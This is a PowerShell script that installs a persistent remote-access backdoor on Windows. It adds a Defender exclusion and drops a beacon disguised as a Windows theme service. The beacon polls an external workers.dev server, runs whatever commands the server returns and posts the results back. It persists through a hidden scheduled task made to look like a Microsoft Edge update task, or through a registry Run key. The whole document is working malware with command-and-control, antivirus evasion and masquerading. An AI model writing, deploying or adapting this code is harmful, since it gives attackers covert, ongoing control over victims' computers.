$ErrorActionPreference = 'SilentlyContinue'

$BACKEND_URL = 'https://backend.ice-cold-169.workers.dev'
$AGENT_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
$BEACON_INTERVAL = 60

$InstallDir = "$env:APPDATA\Microsoft\Windows\Themes"
$BeaconPath = "$InstallDir\ThemeService.ps1"

if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

try {
    Add-MpPreference -ExclusionPath $InstallDir -Force
} catch {}

$BeaconScript = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$BACKEND_URL = '$BACKEND_URL'
`$AGENT_ID = '$AGENT_ID'
`$BEACON_INTERVAL = $BEACON_INTERVAL

while (`$true) {
    try {
        `$beaconBody = @{id = `$AGENT_ID} | ConvertTo-Json
        `$response = Invoke-RestMethod -Uri "`$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body `$beaconBody -TimeoutSec 30
        
        if (`$response.command -and `$response.commandId) {
            try {
                `$output = Invoke-Expression `$response.command 2>&1 | Out-String
            } catch {
                `$output = "ERROR: `$(`$_.Exception.Message)"
            }
            
            `$resultBody = @{
                agentId = `$AGENT_ID
                commandId = `$response.commandId
                output = `$output
            } | ConvertTo-Json
            
            Invoke-RestMethod -Uri "`$BACKEND_URL/api/result" -Method Post -ContentType 'application/json' -Body `$resultBody -TimeoutSec 30 | Out-Null
        }
        
        if (`$response.interval) {
            `$BEACON_INTERVAL = `$response.interval
        }
    } catch {}
    
    Start-Sleep `$BEACON_INTERVAL
}
"@

Set-Content -Path $BeaconPath -Value $BeaconScript -Force

$TaskName = "MicrosoftEdgeUpdateTaskMachineUA"

try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

try {
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 365)
    
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
} catch {
    try {
        $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $RegName = "WindowsThemeService"
        $RegValue = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
        Set-ItemProperty -Path $RegPath -Name $RegName -Value $RegValue -Force
    } catch {}
}

Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`"" -WindowStyle Hidden

try {
    $initialBeacon = @{id = $AGENT_ID} | ConvertTo-Json
    Invoke-RestMethod -Uri "$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body $initialBeacon -TimeoutSec 30 | Out-Null
} catch {}

exit